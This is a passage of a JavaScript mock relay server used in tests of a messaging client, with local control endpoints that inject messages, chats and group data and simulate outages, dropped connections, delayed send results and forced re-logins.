    m = path.match(/^\/api\/upload\/([\w-]+)\/finish$/);
    if (m && method === "POST") {
      const meta = JSON.parse(await readBody(req));
      log.finished.push({ ...meta, bytes: log.uploads[m[1]]?.length ?? 0 });
      json(res, 202, { ok: true, state: "sending" });
      // The home PC's answer can come late, or (a dropped connection at that moment) never arrive.
      if (results.drop) return;
      setTimeout(() => {
        const row = live({ id: "up" + log.finished.length, chat: meta.chat, text: meta.caption, ts: Date.now(), from_me: true, status: "sent", media: "image", mime: "image/png", size: 100, filename: meta.filename, thumb: meta.thumb, width: 10, height: 10, sender: "15559990000" });
        publish({ type: "send_result", client_id: meta.client_id, ok: true, message: row });
      }, results.delay);
      return;
    }
    if (path.startsWith("/api/claude")) return claudeRoute(req, res, path.slice("/api/claude".length), method);

    if (path === "/control/incoming") {
      const body = JSON.parse(await readBody(req));
      return json(res, 200, live({ ts: Date.now(), ...body }));
    }
    if (path === "/control/incoming-offline") {
      const body = JSON.parse(await readBody(req));
      return json(res, 200, addMsg({ ts: Date.now(), ...body }));
    }
    if (path === "/control/add-messages") {
      const body = JSON.parse(await readBody(req));
      const prev = seq;
      const rows = body.messages.map(addMsg);
      publish({ type: "delta", prev, seq, messages: rows, chats: [] });
      return json(res, 200, {});
    }
    if (path === "/control/group-facts") {
      Object.assign(groupFacts, JSON.parse(await readBody(req)));
      return json(res, 200, {});
    }
    if (path === "/control/group-changed") {
      publish({ type: "group_members", jid: JSON.parse(await readBody(req)).jid });
      return json(res, 200, {});
    }
    if (path === "/control/add-chats") {
      const body = JSON.parse(await readBody(req));
      const prev = seq;
      const rows = body.chats.map((c) => {
        addChat(c.jid, c.name, c.ts, c.read ? c.ts : 0);
        return addMsg({ id: `added-${c.jid}`, chat: c.jid, text: c.text ?? "A made-up message", ts: c.ts });
      });
      publish({ type: "delta", prev, seq, messages: rows, chats: body.chats.map((c) => chats.get(c.jid)) });
      return json(res, 200, {});
    }
    if (path === "/control/groups") {
      const body = JSON.parse(await readBody(req));
      groups.groups = body.groups;
      groups.assign = body.assign ?? groups.assign;
      publish(groups);
      return json(res, 200, {});
    }
    if (path === "/control/picture") {
      const body = JSON.parse(await readBody(req));
      pictures.set(body.jid, body.v);
      publish({ type: "picture", jid: body.jid, v: body.v, own: false });
      return json(res, 200, {});
    }
    if (path === "/control/outage") {
      const body = JSON.parse(await readBody(req));
      outage = body.mode;
      if (outage && outage !== "silent") for (const r of subs) r.destroy();
      return json(res, 200, {});
    }
    if (path === "/control/send-results") {
      const b = JSON.parse(String(await readBody(req)) || "{}");
      results.drop = !!b.drop;
      results.delay = Number(b.delay ?? 60);
      return json(res, 200, { ok: true });
    }
    if (path === "/control/fail-reads") {
      failReads = JSON.parse(await readBody(req)).status ?? 0;
      return json(res, 200, {});
    }
    if (path === "/control/drop-stream") {
      for (const r of subs) r.destroy();
      return json(res, 200, {});
    }
    if (path === "/control/status") {
      status = JSON.parse(await readBody(req));
      publish({ type: "status", ...status, head: seq });
      return json(res, 200, {});
    }
    if (path === "/control/finish-login") {
      loginDelayed = false;
      return json(res, 200, {});
    }
    if (path === "/control/relogin") {
      forceRelogin = true;
      for (const r of subs) r.destroy();
      return json(res, 200, {});
    }
    if (path === "/control/relogin-off") {
      forceRelogin = false;
      return json(res, 200, {});
    }
    if (path === "/control/log") return json(res, 200, { ...log, uploads: Object.fromEntries(Object.entries(log.uploads).map(([k, v]) => [k, v.length])) });
    return json(res, 404, { error: "no route" });
  });
  const beat = setInterval(() => {
    if (outage !== "silent") for (const r of subs) r.write(": hb\n\n");
  }, 10000);
  server.on("close", () => clearInterval(beat));

  return {
    server,
    log,
    DM,
    LID,
    DM2,
    GROUP,
    setUpdate: (u) => (update = u),
    setClaudeRunning: (running) => {
      threads.set("updtest", { id: "updtest", title: "Long job", project: "C:\\Projects\\relay", created: Date.now(), updated: Date.now(), running, items: [] });
    },
    finishLogin: () => (loginDelayed = false),
    setRelogin: (on) => {
      forceRelogin = on;
      if (on) for (const r of subs) r.destroy();
    },
  };
}

if (process.argv[1]?.endsWith("fake-relay.mjs")) {
  const { server } = makeRelay();
  server.listen(Number(process.argv[2] ?? 18790), "127.0.0.1", () => console.log("fake relay ready"));
}
